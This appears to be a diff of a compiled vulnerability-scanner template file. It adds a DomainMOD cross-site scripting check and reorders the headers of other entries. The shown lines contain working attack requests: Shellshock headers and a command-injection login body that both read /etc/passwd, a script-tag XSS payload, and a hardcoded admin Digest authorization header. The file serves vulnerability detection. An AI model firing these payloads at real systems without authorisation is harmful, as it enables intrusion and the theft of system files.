@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -7171,6 +7171,22 @@
       ]
     },
     {
+      "id": "CVE-2018-19749",
+      "info": {
+        "name": "DomainMOD 4.11.01 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_username={{username}}&new_password={{password}}\n",
+            "POST /assets/add/account-owner.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nnew_owner=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_notes=\n",
+            "GET /assets/account-owners.php HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-19751",
       "info": {
         "name": "DomainMOD 4.11.01 - Cross-Site Scripting",
@@ -10985,8 +11001,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -15932,8 +15948,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
